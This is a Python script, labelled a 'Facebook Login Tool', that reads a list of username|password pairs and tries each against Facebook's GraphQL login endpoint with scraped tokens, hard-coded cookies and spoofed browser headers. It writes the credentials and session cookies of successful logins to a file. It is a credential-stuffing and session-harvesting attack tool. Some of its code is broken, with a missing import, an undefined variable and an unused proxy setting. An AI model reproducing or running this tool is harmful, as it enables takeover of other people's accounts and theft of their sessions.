import os, time, random, re, sys, requests, json

oks, cps, bkas = [], [], []
loop = 0

try:
    xvx = open('/sdcard/proxy.txt', 'r').read().splitlines()
except:
    xvx = ["http://127.0.0.1:8080"]

logo_text = "🔐 Facebook Login Tool (One ID at a time) 🔐"
linex = lambda: print('-' * 50)
check_lock = lambda cid: "live"

os.system('clear')
print(logo_text)

dfile = input('\n📄 ENTER FILE PATH (e.g., sdcard/mahadi.txt): ')
try:
    dx = open(dfile, 'r').read().splitlines()
except FileNotFoundError:
    print('❌ FILE NOT FOUND...')
    time.sleep(1)
    sys.exit()

if not dx:
    print('❌ FILE IS EMPTY...')
    time.sleep(1)
    sys.exit()

for user in dx:
    os.system('clear')
    print(logo_text)
    print("📲 TOTAL ID : 1")
    print("🔄 PROCESSING ONE ID...")
    linex()
    try:
        ids, pw = user.split('|')
        ids, pw = ids.strip(), pw.strip()
    except:
        continue
    sys.stdout.write(f"\r ⏳ (M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
    sys.stdout.flush()
    try:
        nip = random.choice(xvx)
        proxs = {'http': nip}
        Session = requests.Session()
        free_fb = Session.get('https://m.facebook.com').text
        lsd_value = re.search(r'name="lsd" value="(.*?)"', str(free_fb)).group(1)
        jazoest_value = re.search(r'name="jazoest" value="(.*?)"', str(free_fb)).group(1)
        timestamp = str(int(time.time()))
        data = {
    'av': '0',
    '__user': '0',
    '__a': '1',
    '__req': '7',
    '__hs': '20294.HYP:comet_plat_default_pkg.2.1...0',
    'dpr': '1',
    '__ccg': 'GOOD',
    '__rev': '1025144028',
    '__s': '9i0mpn:tl7b2z:wtg4vs',
    '__hsi': '7530975347099937606',
    '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK5o4q0HU1IEGdwtU2ewbS1Lwqo15E6O1FwlU6KaxyU5N90HwtU5K0UEhwjE',
    '__csr': 'g_8AltPmJcACp2qAarSaXyp8mKSGhbKJ2Vf-Hypp7GmiBO5lG8BC8CiuiB9btqaKBcIWGdyoKE8EcoaGwSyU8Uixmi5ESu487i3W2C-7E4-10yVooU2iwHwkGwnUaUb8iGA2e0Mo3MxicwkU2kw4Aw4Bwq8coy2u0-E2vxm0137UjgoQU08yS00jNO8G00OK8K09Nw1Jaaw7uzy0hU05P60cvw0ETo',
    '__hsdp': 'gyxWxW43AIR1gOzQH88hUCUEk8yVah4Je6org-222SbUcU5y2OdyE0Ia3F2E1fUG3ma8PZ8w-q2y7Q5U460BU1f83Exe0NE0_C04DE2ow1E60X40bsxki0BC1Qw1nq04mo0oow2GU11E0qkw0EUw3i80xK09Pw',
    '__hblp': '01SK05Bo0Du02XC0cswcC0bzw3XU0Uq0xo2nw1d61Jwg85C0lq3C0M811E0LG0uW0qG06OU0PG362u0l2mU5C1qw4gw77wkU0De',
    '__sjsp': 'gyxWxW43AIR1gMiiIwx7yryxgybAF4iQUpxJ3U88boLwPwm8b8Saw2MEeAaw4_yEdoEzeQC49E4x1u11w9u0jO0W8jwcq029y0C80tKg0JO5h82mo7i05tE',
    '__comet_req': '1',
    'lsd': lsd_value,
    'jazoest': jazoest_value,
    '__spin_r': '1025144028',
    '__spin_b': 'trunk',
    '__spin_t': '1753441837',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
    'variables': json.dumps({
        "input": {
            "client_mutation_id": "1",
            "actor_id": "0",
            "app": "facebook",
            "auth_domain_data_key": None,
            "caa_login_request_extra_info": {
                "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////ffAFAA",
                "cuid": "",
                "guid": "ffed65de4275edc5a",
                "jazoest": jazoest_value,
                "lgndim": "eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=",
                "lgnjs": "1753441856",
                "lgnrnd": "041037_s_DL",
                "locale": "en_GB",
                "login_source": "comet_headerless_login",
                "lsd": lsd_value,
                "next": "",
                "prefill_contact_point": "",
                "prefill_source": "",
                "prefill_type": "",
                "skstamp": "",
                "timezone": "-330"
            },
            "credential_type": "password",
            "enc_password": {
                "sensitive_string_value": f"#PWD_BROWSER:0:{timestamp}:{pw}"
            },
            "event_request_id": "fccafc56-7793-475a-82b0-79126c38dc00",
            "identifier": ids,
            "ig_web_device_id": None,
            "initial_request_id": "1",
            "lids": None,
            "login_source": "COMET_HEADERLESS_LOGIN",
            "next": None,
            "password": {
                "sensitive_string_value": f"#PWD_BROWSER:0:{timestamp}:{pw}"
            },
            "persistent": True,
            "trusted_device_records": "{}",
            "waterfall_id": "573eeb24-e791-4463-8ccd-00052da7c549"
        },
        "scale": 1
    }),
    'server_timestamps': 'true',
    'doc_id': '24540252778892185'
}
        cookies = {
        'fr': '0ODGLbVRuEomtBpGJ.AWcJOmSt3W2rnRxHjtxKo1Yma319i3y1R-IztAeSl7j2HS_wbr8.BoStZY..AAA.0.0.Bog2Yt.AWdENOnDWraylKWupKWZEBf1sQY',
        'sb': 'WNZKaCfxN1H4fNVFPY3yVNM1',
        'datr': 'WNZKaAorKsm5JROYCT_7VKaI',
        'ps_l': '1',
        'ps_n': '1',
        'wd': '1072x739',}
        headers = {
        'authority': 'www.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'dpr': '1',
        'origin': 'https://www.facebook.com',
        'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
        'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Chromium";v="118.0.5993.159"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'viewport-width': '885',}
        url = 'https://www.facebook.com/api/graphql/'
        result = Session.post(url, data=data, headers=headers).json()
        if "session_key" in result:
            sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
            ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
            coki = f"sb={sb};{ckkk}"
            print(f"\n✅ OK: {ids}|{pw}")
            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{ids}|{pw}|{coki}\n")
            oks.append(ids)
        else:
            print("\n❌ FAIL: Login not successful.")
    except Exception as e:
        print(f"\n⚠️ ERROR: {e}")
        time.sleep(2)
    loop += 1
    linex()
    print(f"🔍 Response Code: {response.status_code}")  # <-- Added response code print
    print("🔚 PROCESS COMPLETE.")
    linex()
    input("➡️ PRESS ENTER TO LOGIN NEXT ID...")
